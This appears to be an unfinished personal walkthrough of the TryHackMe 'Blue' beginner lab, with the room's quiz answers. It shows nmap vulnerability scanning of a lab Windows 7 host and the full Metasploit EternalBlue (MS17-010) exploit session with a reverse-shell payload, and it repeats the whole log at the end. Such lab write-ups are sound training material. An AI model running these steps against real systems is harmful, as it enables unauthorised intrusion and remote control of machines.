# Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

**Note:** Because I was connecting through OpenVPN,
I had to pass an additional setting `set LHOST tun0` to `msfconsole`,
and I also had to allow the target machine's IP in my firewall (for reverse shell).
Otherwise, the exploit will not succeed and give you shell access.

## Task 1: Recon

Press the Start Machine button below.

Start the AttackBox by pressing the Start AttackBox button at the top of this page.
The AttackBox machine will start in Split-Screen view.
If it is not visible, use the blue Show Split View button at the top of the page.

Scan and learn what exploit this machine is vulnerable to.
Please note that this machine does not respond to ping (ICMP)
and may take a few minutes to boot up.
This room is not meant to be a boot2root CTF, rather,
this is an educational series for complete beginners.
Professionals will likely get very little out of this room beyond
basic practice as the process here is meant to be beginner-focused.

![blue-logo](blue-logo.png)

Art by one of our members, Varg -
[THM Profile](https://tryhackme.com/p/Varg) -
[Instagram](https://www.instagram.com/varghalladesign/) -
[Blue Merch](https://www.redbubble.com/shop/ap/53637482) -
[Twitter](https://twitter.com/Vargnaar)

[Link to Ice, the sequel to Blue](https://tryhackme.com/room/ice)

You can check out the third box in this series,
[Blaster, here](https://tryhackme.com/room/blaster)

The virtual machine used in this room (Blue) can be downloaded for offline usage from
<https://darkstar7471.com/resources.html>

Enjoy the room! For future rooms and write-ups, follow
[@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

***Answer the questions below***

Scan the machine. (If you are unsure how to tackle this, I recommend checking out
the [Nmap room](https://tryhackme.com/room/furthernmap))

*Solution:* Use: `nmap -sV -vv --script vuln TARGET_IP`

```bash
❯ export ip=10.82.154.8
❯ nmap -sV -vv --script vuln $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 10:46 +03
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:46
NSE Timing: About 66.67% done; ETC: 10:47 (0:00:15 remaining)
Completed NSE at 10:47, 34.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 10:47
Scanning 10.82.144.110 [2 ports]
Completed Ping Scan at 10:47, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:47
Completed Parallel DNS resolution of 1 host. at 10:47, 0.00s elapsed
Initiating Connect Scan at 10:47
Scanning 10.82.144.110 (10.82.144.110) [1000 ports]
Discovered open port 3389/tcp on 10.82.144.110
Discovered open port 139/tcp on 10.82.144.110
Discovered open port 445/tcp on 10.82.144.110
Discovered open port 135/tcp on 10.82.144.110
Discovered open port 49152/tcp on 10.82.144.110
Discovered open port 49160/tcp on 10.82.144.110
Discovered open port 49153/tcp on 10.82.144.110
Discovered open port 49158/tcp on 10.82.144.110
Discovered open port 49154/tcp on 10.82.144.110
Completed Connect Scan at 10:47, 2.86s elapsed (1000 total ports)
Initiating Service scan at 10:47
Scanning 9 services on 10.82.144.110 (10.82.144.110)
Service scan Timing: About 55.56% done; ETC: 10:49 (0:00:43 remaining)
Completed Service scan at 10:48, 59.91s elapsed (9 services on 1 host)
NSE: Script scanning 10.82.144.110.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:48
NSE: [firewall-bypass 10.82.144.110] lacks privileges.
NSE Timing: About 99.91% done; ETC: 10:49 (0:00:00 remaining)
Completed NSE at 10:49, 60.52s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
NSE: [tls-ticketbleed 10.82.144.110:135] Not running due to lack of privileges.
NSE: [ssl-ccs-injection 10.82.144.110:3389] No response from server: ERROR
Completed NSE at 10:49, 2.82s elapsed
Nmap scan report for 10.82.144.110 (10.82.144.110)
Host is up, received conn-refused (0.079s latency).
Scanned at 2025-11-24 10:47:30 +03 for 126s
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.56 seconds
```

***Correct answer: No answer needed***

How many ports are open with a port number under 1000?

***Correct answer: 3***

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

***Correct answer: ms17-010***

exploit/windows/smb/ms17_010_eternalblue
RHOSTS

## Task 2: Gain access

Exploit the machine and gain a foothold.

***Answer the questions below***

Start [Metasploit](https://tryhackme.com/module/metasploit)

*Solution:* Run the command `msfconsole`

```bash
❯ msfconsole
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/spam/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
waiting for server to start.... done
server started
success
Metasploit tip: Keep track of findings and observations with notes

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       =[ metasploit v6.4.99-dev-                               ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,680 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf >
```

***Correct answer: No answer needed***

Find the exploitation code we will run against the machine.
What is the full path of the code? (Ex: exploit/........)

*Solution:* Run `search ms17-010` in the MSF console.

```bash
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

***Correct answer: exploit/windows/smb/ms17_010_eternalblue***

Show options and set the one required value.
What is the name of this value? (All caps for submission)

*Solution:* First use the exploit to change the shell prompt, then view options.

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.c
                                             om/docs/using-metasploit/basics/using-metasploit.
                                             html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.1.100    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.82.154.8
RHOSTS => 10.82.154.8
```

***Correct answer: RHOSTS***

Usually it would be fine to run this exploit as is;
however, for the sake of learning, you should do one more thing
before exploiting the target. Enter the following command and press enter:

```bash
set payload windows/x64/shell/reverse_tcp
```

With that done, run the exploit!

*Solution:* First, I also had to set the `LHOST` variable to `tun0` (using OpenVPN).

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.139.31:4444
[*] 10.82.154.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.82.154.8:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.82.154.8:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.82.154.8:445 - The target is vulnerable.
[*] 10.82.154.8:445 - Connecting to target for exploitation.
[+] 10.82.154.8:445 - Connection established for exploitation.
[+] 10.82.154.8:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.82.154.8:445 - CORE raw buffer dump (42 bytes)
[*] 10.82.154.8:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.82.154.8:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.82.154.8:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.82.154.8:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.82.154.8:445 - Trying exploit with 12 Groom Allocations.
[*] 10.82.154.8:445 - Sending all but last fragment of exploit packet
[*] 10.82.154.8:445 - Starting non-paged pool grooming
[+] 10.82.154.8:445 - Sending SMBv2 buffers
[+] 10.82.154.8:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.82.154.8:445 - Sending final SMBv2 buffers.
[*] 10.82.154.8:445 - Sending last fragment of exploit packet!
[*] 10.82.154.8:445 - Receiving response from exploit packet
[+] 10.82.154.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.82.154.8:445 - Sending egg to corrupted connection.
[*] 10.82.154.8:445 - Triggering free of corrupted buffer.
```

***Correct answer: No answer needed***

Confirm that the exploit has run correctly.
You may have to press enter for the DOS shell to appear.
Background this shell (CTRL + Z).
If this failed, you may have to reboot the target VM.
Try running it again before a reboot of the target.

***Correct answer: No answer needed***

## Task 3

### Subheading

***Answer the questions below***

***Correct answer:***

## Task 4

### Subheading

***Answer the questions below***

***Correct answer:***

## Task 5

### Subheading

***Answer the questions below***

***Correct answer:***

## Task 6

### Subheading

***Answer the questions below***

***Correct answer:***

## Task 7

### Subheading

***Answer the questions below***

***Correct answer:***

Must disable firewall at the beginning, and set `LHOST` to `tun0` in `msfconsole`.

```bash
❯ sudo openvpn ~/Downloads/spamegg.ovpn
❯ export ip=10.82.154.8
❯ nmap -sV -vv --script vuln $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 10:46 +03
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:46
NSE Timing: About 66.67% done; ETC: 10:47 (0:00:15 remaining)
Completed NSE at 10:47, 34.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 10:47
Scanning 10.82.144.110 [2 ports]
Completed Ping Scan at 10:47, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:47
Completed Parallel DNS resolution of 1 host. at 10:47, 0.00s elapsed
Initiating Connect Scan at 10:47
Scanning 10.82.144.110 (10.82.144.110) [1000 ports]
Discovered open port 3389/tcp on 10.82.144.110
Discovered open port 139/tcp on 10.82.144.110
Discovered open port 445/tcp on 10.82.144.110
Discovered open port 135/tcp on 10.82.144.110
Discovered open port 49152/tcp on 10.82.144.110
Discovered open port 49160/tcp on 10.82.144.110
Discovered open port 49153/tcp on 10.82.144.110
Discovered open port 49158/tcp on 10.82.144.110
Discovered open port 49154/tcp on 10.82.144.110
Completed Connect Scan at 10:47, 2.86s elapsed (1000 total ports)
Initiating Service scan at 10:47
Scanning 9 services on 10.82.144.110 (10.82.144.110)
Service scan Timing: About 55.56% done; ETC: 10:49 (0:00:43 remaining)
Completed Service scan at 10:48, 59.91s elapsed (9 services on 1 host)
NSE: Script scanning 10.82.144.110.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:48
NSE: [firewall-bypass 10.82.144.110] lacks privileges.
NSE Timing: About 99.91% done; ETC: 10:49 (0:00:00 remaining)
Completed NSE at 10:49, 60.52s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
NSE: [tls-ticketbleed 10.82.144.110:135] Not running due to lack of privileges.
NSE: [ssl-ccs-injection 10.82.144.110:3389] No response from server: ERROR
Completed NSE at 10:49, 2.82s elapsed
Nmap scan report for 10.82.144.110 (10.82.144.110)
Host is up, received conn-refused (0.079s latency).
Scanned at 2025-11-24 10:47:30 +03 for 126s
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.56 seconds
❯ msfconsole
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/spam/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
waiting for server to start.... done
server started
success
Metasploit tip: Keep track of findings and observations with notes

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       =[ metasploit v6.4.99-dev-                               ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,680 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.c
                                             om/docs/using-metasploit/basics/using-metasploit.
                                             html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.1.100    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.82.154.8
RHOSTS => 10.82.154.8
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.139.31:4444
[*] 10.82.154.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.82.154.8:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.82.154.8:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.82.154.8:445 - The target is vulnerable.
[*] 10.82.154.8:445 - Connecting to target for exploitation.
[+] 10.82.154.8:445 - Connection established for exploitation.
[+] 10.82.154.8:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.82.154.8:445 - CORE raw buffer dump (42 bytes)
[*] 10.82.154.8:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.82.154.8:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.82.154.8:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.82.154.8:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.82.154.8:445 - Trying exploit with 12 Groom Allocations.
[*] 10.82.154.8:445 - Sending all but last fragment of exploit packet
[*] 10.82.154.8:445 - Starting non-paged pool grooming
[+] 10.82.154.8:445 - Sending SMBv2 buffers
[+] 10.82.154.8:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.82.154.8:445 - Sending final SMBv2 buffers.
[*] 10.82.154.8:445 - Sending last fragment of exploit packet!
[*] 10.82.154.8:445 - Receiving response from exploit packet
[+] 10.82.154.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.82.154.8:445 - Sending egg to corrupted connection.
[*] 10.82.154.8:445 - Triggering free of corrupted buffer.
```
